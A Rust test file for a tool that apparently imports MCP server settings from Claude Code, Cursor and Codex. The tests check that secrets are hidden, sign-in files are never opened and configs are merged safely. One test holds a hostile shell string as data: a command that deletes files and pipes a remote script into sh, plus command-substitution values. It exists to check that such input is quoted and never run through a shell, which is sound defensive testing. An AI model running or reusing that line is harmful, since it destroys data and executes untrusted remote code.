//! ADR 0068, from fixture files built from each tool's documentation, in a temp home
//! folder: never this computer's own files.

use std::os::unix::fs::PermissionsExt;
use std::path::{Path, PathBuf};

use super::link::{Bridge, How, TOKEN_SHOWN, plan_link, remove_link, write_link};
use super::*;
use crate::apps::AppSpec;

const CLAUDE: &str = include_str!("fixtures/claude.json");
const CURSOR: &str = include_str!("fixtures/cursor-mcp.json");
const CODEX: &str = include_str!("fixtures/codex-config.toml");
const GITHUB_TOKEN: &str = "ghp_FIXTUREfixtureFIXTUREfixture0001";
const AIRTABLE_KEY: &str = "patFIXTURE.fixture0123456789";
const NOTION_KEY: &str = "sk-FIXTUREnotionkey000000000000";
const NOTION_PASSWORD: &str = "hunter2hunter2";
const DOCS_SECRET: &str = "FIXTUREdocsSecretValue";
const SIGN_IN_SENTINEL: &str = "SIGN-IN-FILE-CONTENTS-NEVER-READ";

struct Home {
    _tmp: tempfile::TempDir,
    root: PathBuf,
}

impl Home {
    fn new() -> Self {
        let tmp = tempfile::tempdir().unwrap();
        let root = tmp.path().canonicalize().unwrap();
        Home { _tmp: tmp, root }
    }

    fn put(&self, rel: &str, text: &str) -> PathBuf {
        let p = self.root.join(rel);
        std::fs::create_dir_all(p.parent().unwrap()).unwrap();
        std::fs::write(&p, text).unwrap();
        p
    }

    fn all(&self) -> &Self {
        std::fs::create_dir_all(self.root.join("code/site")).unwrap();
        self.put(
            ".claude.json",
            &CLAUDE.replace("@HOME@", &self.root.display().to_string()),
        );
        self.put(".cursor/mcp.json", CURSOR);
        self.put(".codex/config.toml", CODEX);
        self
    }

    fn at(&self) -> Where {
        Where::new(&self.root)
    }
}

fn ghost() -> Ghost {
    Ghost {
        ports: vec![47824],
        ..Ghost::default()
    }
}

fn run(w: &Where, g: &Ghost) -> (Vec<ToolFound>, Vec<PathBuf>) {
    let mut opened = Vec::new();
    let found = detect(w, g, &mut opened);
    (found, opened)
}

fn tool(found: &[ToolFound], t: Tool) -> &ToolFound {
    found.iter().find(|f| f.tool == t).unwrap()
}

fn app<'a>(t: &'a ToolFound, name: &str) -> &'a FoundApp {
    t.apps
        .iter()
        .find(|a| a.name == name)
        .unwrap_or_else(|| panic!("{name} in {:?}", t.apps))
}

/// Everything detection hands out that could be shown: never a value.
fn shown_text(found: &[ToolFound]) -> String {
    let mut out = String::new();
    for t in found {
        for f in &t.files {
            out += &format!("{} {:?} {:?}\n", f.shown, f.state, f.problems);
        }
        for a in &t.apps {
            out += &format!(
                "{} {} {} {:?} {:?} {:?} {:?} {:?} {:?}\n",
                a.name, a.suggested, a.scope, a.shown, a.moved, a.needs, a.notes, a.skip, a
            );
        }
        out += &format!("{:?}\n", t.linked);
    }
    out
}

#[test]
fn each_tools_documented_files_are_read_into_apps() {
    let h = Home::new();
    h.all();
    let (found, _) = run(&h.at(), &ghost());
    assert!(found.iter().all(|t| t.installed));
    let claude = tool(&found, Tool::ClaudeCode);
    // User scope, local scope under the project's path; never a project outside home.
    let names: Vec<&str> = claude.apps.iter().map(|a| a.name.as_str()).collect();
    assert_eq!(
        names,
        ["github", "airtable", "api-server", "old-events", "stripe"]
    );
    assert_eq!(app(claude, "stripe").scope, "~/code/site only");
    assert_eq!(app(claude, "github").scope, "every project");
    // Ghost itself is not an app to connect: it says the tool already uses Ghost.
    let linked = claude.linked.as_ref().unwrap();
    assert_eq!(linked.client.as_deref(), Some("claude-code"));
    assert_eq!(linked.entry, "ghost");
    // SSE is named, not offered.
    assert!(matches!(
        app(claude, "old-events").skip,
        Some(Skip::Unsupported(_))
    ));
    // An address with no key of its own signs in through Ghost.
    let stripe = app(claude, "stripe");
    assert!(stripe.sign_in && stripe.skip.is_none());
    assert_eq!(
        stripe.shown,
        Shown::Address("https://mcp.stripe.com/".into())
    );

    let cursor = tool(&found, Tool::Cursor);
    assert!(
        cursor.files[0].commented,
        "Cursor's file has a comment and a trailing comma"
    );
    // The same GitHub as Claude Code's: offered once.
    assert_eq!(
        app(cursor, "github").skip,
        Some(Skip::Same {
            tool: "Claude Code".into(),
            name: "github".into()
        })
    );
    assert!(
        matches!(app(cursor, "project-script").skip, Some(Skip::Unsupported(ref w)) if w.contains("workspaceFolder"))
    );
    let home_script = app(cursor, "home-script");
    assert_eq!(
        home_script.shown,
        Shown::Command(vec![format!("{}/bin/notes-mcp", h.root.display())])
    );
    assert_eq!(home_script.needs, ["NOTES_TOKEN"]);

    let codex = tool(&found, Tool::Codex);
    let names: Vec<&str> = codex.apps.iter().map(|a| a.name.as_str()).collect();
    assert_eq!(names, ["context7", "figma", "sentry", "docs", "retired"]);
    let figma = app(codex, "figma");
    assert!(!figma.sign_in, "a bearer variable is its key");
    assert_eq!(figma.needs, ["FIGMA_OAUTH_TOKEN"]);
    assert_eq!(
        figma.planned().unwrap().spec.headers["Authorization"],
        "Bearer ${FIGMA_OAUTH_TOKEN}"
    );
    assert!(
        app(codex, "sentry").sign_in,
        "Codex signs an address in by default"
    );
    assert!(app(codex, "docs").notes[0].contains("/srv/docs"));
    assert_eq!(
        app(codex, "docs").planned().unwrap().spec.env["HOME_REGION"],
        "${HOME_REGION}"
    );
    assert_eq!(
        app(codex, "retired").skip,
        Some(Skip::Unsupported("Turned off in Codex.".into()))
    );
    assert_eq!(
        noticed_line(&found).unwrap(),
        "Claude Code, Cursor, and Codex are set up on this computer."
    );
}

#[test]
fn a_secret_goes_into_the_plan_and_is_never_shown() {
    let h = Home::new();
    h.all();
    let (found, _) = run(&h.at(), &ghost());
    let text = shown_text(&found);
    for secret in [
        GITHUB_TOKEN,
        AIRTABLE_KEY,
        NOTION_KEY,
        NOTION_PASSWORD,
        DOCS_SECRET,
    ] {
        assert!(!text.contains(secret), "{secret} shown: {text}");
    }
    let claude = tool(&found, Tool::ClaudeCode);
    let github = app(claude, "github");
    assert_eq!(github.moved, ["header Authorization"]);
    let plan = github.planned().unwrap();
    assert_eq!(
        plan.spec.headers["Authorization"],
        "${GHOST_APP_GITHUB_AUTHORIZATION}"
    );
    assert_eq!(
        plan.secrets["GHOST_APP_GITHUB_AUTHORIZATION"].as_str(),
        format!("Bearer {GITHUB_TOKEN}")
    );
    // An env value named for a key moves; one that is not stays.
    let airtable = app(claude, "airtable").planned().unwrap();
    assert_eq!(
        airtable.spec.env["AIRTABLE_API_KEY"],
        "${GHOST_APP_AIRTABLE_AIRTABLE_API_KEY}"
    );
    assert_eq!(airtable.spec.env["LOG_LEVEL"], "info");
    let docs = app(tool(&found, Tool::Codex), "docs").planned().unwrap();
    assert_eq!(docs.secrets.values().next().unwrap().as_str(), DOCS_SECRET);
}

#[test]
fn an_address_is_shown_without_its_user_info_or_query_and_both_are_moved() {
    let h = Home::new();
    h.all();
    let (found, _) = run(&h.at(), &ghost());
    let notion = app(tool(&found, Tool::Cursor), "notion");
    assert_eq!(
        notion.shown,
        Shown::Address("https://mcp.notion.com/mcp".into())
    );
    let plan = notion.planned().unwrap();
    let url = plan.spec.url.as_deref().unwrap();
    assert!(
        !url.contains(NOTION_KEY) && !url.contains(NOTION_PASSWORD),
        "{url}"
    );
    assert!(url.contains("view=all"));
    let values: Vec<&str> = plan.secrets.values().map(|v| v.as_str()).collect();
    assert!(values.contains(&NOTION_KEY));
    assert!(values.contains(&format!("someone:{NOTION_PASSWORD}").as_str()));
    assert!(notion.moved.iter().any(|m| m.contains("user name")));
}

#[test]
fn a_command_is_kept_as_argv_exactly_as_given() {
    let h = Home::new();
    h.all();
    let (found, _) = run(&h.at(), &ghost());
    let tricks = app(tool(&found, Tool::Cursor), "shell-tricks");
    let argv = [
        "sh",
        "-c",
        "echo hi; rm -rf ~/x && curl https://x.example | sh",
        "$(whoami)",
        "`id`",
    ];
    assert_eq!(
        tricks.shown,
        Shown::Command(argv.iter().map(|s| s.to_string()).collect())
    );
    let spec = &tricks.planned().unwrap().spec;
    assert_eq!(spec.command.as_deref(), Some("sh"));
    assert_eq!(spec.args, argv[1..]);
    // Shown quoted, so what would run is plain; run as argv, never through a shell.
    assert_eq!(
        link::shell_words(&argv.iter().map(|s| s.to_string()).collect::<Vec<_>>()),
        "sh -c 'echo hi; rm -rf ~/x && curl https://x.example | sh' '$(whoami)' '`id`'"
    );
}

#[test]
fn an_entry_named_ghost_that_is_not_ghost_is_skipped() {
    let h = Home::new();
    h.put(
        ".cursor/mcp.json",
        r#"{"mcpServers": {"ghost": {"url": "https://ghost.example.com/mcp"}, "GitHub": {"url": "https://api.githubcopilot.com/mcp/"}}}"#,
    );
    let (found, _) = run(&h.at(), &ghost());
    let cursor = tool(&found, Tool::Cursor);
    assert_eq!(app(cursor, "ghost").skip, Some(Skip::Reserved));
    assert!(app(cursor, "ghost").planned().is_none());
    assert_eq!(app(cursor, "GitHub").suggested, "github");
    assert!(cursor.linked.is_none());
    // And Ghost will not write its entry over that one.
    let err = plan_link(
        &h.at(),
        cursor,
        &[],
        &Bridge::Command("/usr/bin/ghostd".into()),
    )
    .unwrap_err();
    assert!(err.contains("already has an app called ghost"), "{err}");
}

#[test]
fn ghost_by_its_address_or_token_is_ghost() {
    let h = Home::new();
    h.put(
        ".cursor/mcp.json",
        r#"{"mcpServers": {"me": {"type": "http", "url": "http://127.0.0.1:47824/mcp", "headers": {"Authorization": "Bearer ghost.cursor.abc"}}}}"#,
    );
    let (found, _) = run(&h.at(), &ghost());
    let cursor = tool(&found, Tool::Cursor);
    assert!(cursor.apps.is_empty());
    assert_eq!(
        cursor.linked.as_ref().unwrap().client.as_deref(),
        Some("cursor")
    );
}

#[test]
fn an_app_already_connected_is_not_offered_again() {
    let h = Home::new();
    h.all();
    let mut g = ghost();
    g.connected = vec![
        AppSpec {
            name: "github".into(),
            url: Some("https://api.githubcopilot.com/mcp".into()),
            headers: [(
                "Authorization".to_string(),
                "${GHOST_APP_GITHUB_AUTHORIZATION}".to_string(),
            )]
            .into_iter()
            .collect(),
            ..AppSpec::default()
        },
        AppSpec {
            name: "airtable".into(),
            command: Some("npx".into()),
            args: vec!["-y".into(), "airtable-mcp-server".into()],
            ..AppSpec::default()
        },
    ];
    let (found, _) = run(&h.at(), &g);
    let claude = tool(&found, Tool::ClaudeCode);
    assert_eq!(
        app(claude, "github").skip,
        Some(Skip::Connected("github".into()))
    );
    assert_eq!(
        app(claude, "airtable").skip,
        Some(Skip::Connected("airtable".into()))
    );
    // A new one takes a name no connected app has.
    let h2 = Home::new();
    h2.put(
        ".cursor/mcp.json",
        r#"{"mcpServers": {"github": {"url": "https://other.example/mcp"}}}"#,
    );
    let (found, _) = run(&h2.at(), &g);
    assert_eq!(
        app(tool(&found, Tool::Cursor), "github").suggested,
        "github-2"
    );
}

#[test]
fn a_file_too_large_is_a_line_and_not_read() {
    let h = Home::new();
    let big = format!(
        "{{\"mcpServers\": {{\"a\": {{\"url\": \"https://a.example\"}}}}, \"pad\": \"{}\"}}",
        "x".repeat(2 * 1024 * 1024)
    );
    h.put(".cursor/mcp.json", &big);
    let (found, opened) = run(&h.at(), &ghost());
    let cursor = tool(&found, Tool::Cursor);
    assert!(matches!(cursor.files[0].state, FileState::TooLarge(n) if n > FILE_CAP));
    assert!(cursor.apps.is_empty());
    assert!(
        cursor.files[0]
            .problem_line(Tool::Cursor)
            .unwrap()
            .contains("2.1 MB")
    );
    assert!(opened.is_empty(), "{opened:?}");
}

#[test]
fn a_malformed_file_is_a_line_and_left_as_it_is() {
    let h = Home::new();
    let path = h.put(".cursor/mcp.json", "{\"mcpServers\": {\"a\": ");
    std::fs::set_permissions(&path, std::fs::Permissions::from_mode(0o640)).unwrap();
    let (found, _) = run(&h.at(), &ghost());
    let cursor = tool(&found, Tool::Cursor);
    assert!(matches!(cursor.files[0].state, FileState::Unreadable(_)));
    assert_eq!(
        cursor.files[0].problem_line(Tool::Cursor).unwrap(),
        "~/.cursor/mcp.json could not be read as JSON, so Ghost left it as it is."
    );
    // Letting Cursor use Ghost leaves it alone too.
    assert!(plan_link(&h.at(), cursor, &[], &Bridge::Command("/g".into())).is_err());
    assert_eq!(
        std::fs::read_to_string(&path).unwrap(),
        "{\"mcpServers\": {\"a\": "
    );
    assert_eq!(
        std::fs::metadata(&path).unwrap().permissions().mode() & 0o777,
        0o640
    );
    let h2 = Home::new();
    h2.put(".codex/config.toml", "[mcp_servers.a\ncommand=");
    let (found, _) = run(&h2.at(), &ghost());
    assert!(matches!(
        tool(&found, Tool::Codex).files[0].state,
        FileState::Unreadable(_)
    ));
}

#[test]
fn a_link_out_of_the_home_folder_is_not_followed_and_one_inside_is() {
    let outside = tempfile::tempdir().unwrap();
    std::fs::write(outside.path().join("mcp.json"), CURSOR).unwrap();
    let h = Home::new();
    std::fs::create_dir_all(h.root.join(".cursor")).unwrap();
    std::os::unix::fs::symlink(
        outside.path().join("mcp.json"),
        h.root.join(".cursor/mcp.json"),
    )
    .unwrap();
    let (found, opened) = run(&h.at(), &ghost());
    let cursor = tool(&found, Tool::Cursor);
    assert_eq!(cursor.files[0].state, FileState::Outside);
    assert!(cursor.apps.is_empty());
    assert!(opened.iter().all(|p| p.starts_with(&h.root)), "{opened:?}");
    // A dotfiles folder in the home folder is followed.
    let h2 = Home::new();
    h2.put(
        "dotfiles/cursor.json",
        r#"{"mcpServers": {"linear": {"url": "https://mcp.linear.app/mcp"}}}"#,
    );
    std::fs::create_dir_all(h2.root.join(".cursor")).unwrap();
    std::os::unix::fs::symlink(
        h2.root.join("dotfiles/cursor.json"),
        h2.root.join(".cursor/mcp.json"),
    )
    .unwrap();
    let (found, _) = run(&h2.at(), &ghost());
    assert_eq!(tool(&found, Tool::Cursor).apps.len(), 1);
}

#[test]
fn a_sign_in_file_is_never_opened() {
    let h = Home::new();
    h.all();
    for f in [
        ".claude/.credentials.json",
        ".codex/auth.json",
        ".cursor/auth.json",
        ".config/Cursor/User/globalStorage/state.vscdb",
        ".claude/settings.json",
    ] {
        h.put(f, SIGN_IN_SENTINEL);
    }
    // Even when a project or a link points at one.
    std::os::unix::fs::symlink(
        h.root.join(".codex/auth.json"),
        h.root.join("code/site/.mcp.json"),
    )
    .unwrap();
    let w = h.at();
    for t in TOOLS {
        for f in files_for(&w, t) {
            assert!(!is_credential(&h.root, &f), "{f:?}");
        }
    }
    let (found, opened) = run(&w, &ghost());
    for p in &opened {
        assert!(!is_credential(&h.root, p), "{p:?} was opened");
        let name = p.file_name().unwrap().to_str().unwrap();
        assert!(!["auth.json", ".credentials.json"].contains(&name), "{p:?}");
        assert!(!p.starts_with(h.root.join(".claude")), "{p:?}");
    }
    assert!(!shown_text(&found).contains(SIGN_IN_SENTINEL));
    let mut opened = Vec::new();
    for f in [".claude/.credentials.json", ".codex/auth.json"] {
        assert!(read::read_bounded(&h.root, &h.root.join(f), FILE_CAP, &mut opened).is_err());
    }
    assert!(opened.is_empty());
}

fn cursor_found(h: &Home) -> ToolFound {
    let (found, _) = run(&h.at(), &ghost());
    found.into_iter().find(|t| t.tool == Tool::Cursor).unwrap()
}

#[test]
fn letting_cursor_use_ghost_merges_its_file_and_keeps_the_rest() {
    let h = Home::new();
    let before = r#"{
  "zeta": 1,
  "mcpServers": {
    "linear": {"url": "https://mcp.linear.app/mcp", "x-unknown": {"keep": true}},
    "alpha": {"command": "a"}
  },
  "alpha": [1, 2]
}"#;
    let path = h.put(".cursor/mcp.json", before);
    std::fs::set_permissions(&path, std::fs::Permissions::from_mode(0o640)).unwrap();
    let w = h.at();
    let found = cursor_found(&h);
    let bridge = Bridge::Command("/usr/lib/heka-ghost-desktop/ghostd".into());
    let plan = plan_link(&w, &found, &["cursor".into()], &bridge).unwrap();
    assert_eq!(plan.client, "cursor-2");
    assert!(plan.shown().starts_with("Adds to ~/.cursor/mcp.json:"));
    let backup = write_link(&w, &plan, &bridge, "unused", "20261114T120000")
        .unwrap()
        .unwrap();
    assert_eq!(
        backup,
        h.root.join(".cursor/mcp.json.ghost-backup-20261114T120000")
    );
    assert_eq!(std::fs::read_to_string(&backup).unwrap(), before);
    assert_eq!(
        std::fs::metadata(&backup).unwrap().permissions().mode() & 0o777,
        0o640
    );
    let after = std::fs::read_to_string(&path).unwrap();
    assert_eq!(
        std::fs::metadata(&path).unwrap().permissions().mode() & 0o777,
        0o640
    );
    // Order kept, unknown keys kept, Ghost's entry last.
    let at = |k: &str| after.find(k).unwrap();
    assert!(
        at("\"zeta\"") < at("\"mcpServers\"")
            && at("\"linear\"") < at("\"alpha\": {")
            && at("\"alpha\": {") < at("\"ghost\"")
    );
    assert!(after.contains("x-unknown") && after.contains("\"alpha\": ["));
    let v: serde_json::Value = serde_json::from_str(&after).unwrap();
    assert_eq!(
        v["mcpServers"]["ghost"]["args"],
        serde_json::json!(["mcp", "serve", "--client", "cursor-2"])
    );
    assert!(!after.contains("unused"), "the command form holds no token");
    // Found again, Cursor uses Ghost, and nothing is offered twice.
    let again = cursor_found(&h);
    assert_eq!(
        again.linked.as_ref().unwrap().client.as_deref(),
        Some("cursor-2")
    );
    assert!(plan_link(&w, &again, &[], &bridge).is_err());
    // And taken back out: only Ghost's entry.
    remove_link(&w, Tool::Cursor, "ghost", "20261114T120100").unwrap();
    let v: serde_json::Value =
        serde_json::from_str(&std::fs::read_to_string(&path).unwrap()).unwrap();
    assert!(v["mcpServers"].get("ghost").is_none());
    assert_eq!(v["mcpServers"]["linear"]["x-unknown"]["keep"], true);
}

#[test]
fn by_address_the_token_goes_only_into_the_file_written() {
    let h = Home::new();
    let w = h.at();
    std::fs::create_dir_all(h.root.join(".cursor")).unwrap();
    let found = cursor_found(&h);
    let bridge = Bridge::Address("127.0.0.1:47824".into());
    let plan = plan_link(&w, &found, &[], &bridge).unwrap();
    assert!(plan.by_address && plan.shown().contains(TOKEN_SHOWN));
    assert!(
        write_link(&w, &plan, &bridge, "ghost.cursor.SECRET", "s")
            .unwrap()
            .is_none()
    );
    let path = h.root.join(".cursor/mcp.json");
    let v: serde_json::Value =
        serde_json::from_str(&std::fs::read_to_string(&path).unwrap()).unwrap();
    assert_eq!(
        v["mcpServers"]["ghost"]["headers"]["Authorization"],
        "Bearer ghost.cursor.SECRET"
    );
    assert_eq!(
        std::fs::metadata(&path).unwrap().permissions().mode() & 0o777,
        0o600
    );
}

#[test]
fn a_commented_file_is_not_written_and_the_entry_is_shown_to_add_by_hand() {
    let h = Home::new();
    h.put(".cursor/mcp.json", CURSOR);
    let found = cursor_found(&h);
    let err = plan_link(&h.at(), &found, &[], &Bridge::Command("/g".into())).unwrap_err();
    assert!(
        err.contains("has comments") && err.contains("\"mcpServers\""),
        "{err}"
    );
}

#[test]
fn codex_is_written_by_its_command_or_into_its_toml_keeping_the_rest() {
    let h = Home::new();
    let path = h.put(".codex/config.toml", CODEX);
    let mut w = h.at();
    let bridge = Bridge::Command("/usr/bin/ghostd".into());
    // With the codex command: its own `mcp add`.
    w.binaries
        .insert(Tool::Codex, PathBuf::from("/usr/bin/codex"));
    let (found, _) = run(&w, &ghost());
    let codex = tool(&found, Tool::Codex);
    let plan = plan_link(&w, codex, &[], &bridge).unwrap();
    assert_eq!(
        plan.how,
        How::Command(
            [
                "/usr/bin/codex",
                "mcp",
                "add",
                "ghost",
                "--",
                "/usr/bin/ghostd",
                "mcp",
                "serve",
                "--client",
                "codex"
            ]
            .iter()
            .map(|s| s.to_string())
            .collect()
        )
    );
    // Without it, into the file, comments and order kept.
    w.binaries.clear();
    let (found, _) = run(&w, &ghost());
    let plan = plan_link(&w, tool(&found, Tool::Codex), &[], &bridge).unwrap();
    write_link(&w, &plan, &bridge, "t", "s").unwrap();
    let after = std::fs::read_to_string(&path).unwrap();
    assert!(after.starts_with(CODEX), "{after}");
    assert!(after.contains("[mcp_servers.ghost]\ncommand = \"/usr/bin/ghostd\"\nargs = [\"mcp\", \"serve\", \"--client\", \"codex\"]"), "{after}");
    let (found, _) = run(&w, &ghost());
    assert_eq!(
        tool(&found, Tool::Codex)
            .linked
            .as_ref()
            .unwrap()
            .client
            .as_deref(),
        Some("codex")
    );
    remove_link(&w, Tool::Codex, "ghost", "s2").unwrap();
    assert_eq!(
        std::fs::read_to_string(&path).unwrap().trim_end(),
        CODEX.trim_end()
    );
}

#[test]
fn claude_code_is_written_by_its_own_command_when_it_is_there() {
    let h = Home::new();
    h.all();
    let mut w = h.at();
    w.binaries
        .insert(Tool::ClaudeCode, PathBuf::from("/home/u/.local/bin/claude"));
    // Ghost's entry taken out so it is not linked yet.
    let text = std::fs::read_to_string(h.root.join(".claude.json")).unwrap();
    let v: serde_json::Value = serde_json::from_str(&text).unwrap();
    let mut v2 = v.clone();
    v2["mcpServers"].as_object_mut().unwrap().remove("ghost");
    h.put(".claude.json", &v2.to_string());
    let (found, _) = run(&w, &ghost());
    let plan = plan_link(
        &w,
        tool(&found, Tool::ClaudeCode),
        &[],
        &Bridge::Command("/opt/ghostd".into()),
    )
    .unwrap();
    assert_eq!(
        plan.shown(),
        "/home/u/.local/bin/claude mcp add --scope user ghost -- /opt/ghostd mcp serve --client claude-code"
    );
    let plan = plan_link(
        &w,
        tool(&found, Tool::ClaudeCode),
        &[],
        &Bridge::Address("127.0.0.1:47824".into()),
    )
    .unwrap();
    assert_eq!(
        plan.argv("ghost.claude-code.T").unwrap().last().unwrap(),
        "Authorization: Bearer ghost.claude-code.T"
    );
}

#[test]
fn variables_only_the_other_tool_knows_are_named() {
    let h = Home::new();
    h.all();
    let (found, _) = run(&h.at(), &ghost());
    let api = app(tool(&found, Tool::ClaudeCode), "api-server");
    assert!(api.skip.is_none(), "{:?}", api.skip);
    assert_eq!(api.shown, Shown::Address("${API_BASE_URL}/mcp".into()));
    assert!(api.notes[0].contains("API_BASE_URL"));
    assert_eq!(api.needs, ["API_BASE_URL", "API_KEY"]);
}

#[test]
fn local_models_and_keys_are_read_by_name_only() {
    assert_eq!(
        models::model_names(r#"{"models": [{"name": "llama3.2:latest"}, {"name": "qwen3:8b"}]}"#),
        ["llama3.2:latest", "qwen3:8b"]
    );
    assert_eq!(
        models::model_names(r#"{"data": [{"id": "qwen2.5-7b-instruct"}]}"#),
        ["qwen2.5-7b-instruct"]
    );
    assert!(models::model_names("not json").is_empty());
    let env: std::collections::HashMap<String, String> = [
        ("OPENROUTER_API_KEY".to_string(), "sk-or-x".to_string()),
        ("OPENAI_API_KEY".to_string(), " ".to_string()),
    ]
    .into_iter()
    .collect();
    assert_eq!(
        models::keys_present(&env),
        [("OPENROUTER_API_KEY", "openrouter")]
    );
}

#[test]
fn nothing_found_is_nothing_said() {
    let h = Home::new();
    let (found, opened) = run(&h.at(), &ghost());
    assert!(found.iter().all(|t| !t.installed && t.apps.is_empty()));
    assert!(noticed_line(&found).is_none());
    assert!(opened.is_empty());
    let _ = Path::new("");
}
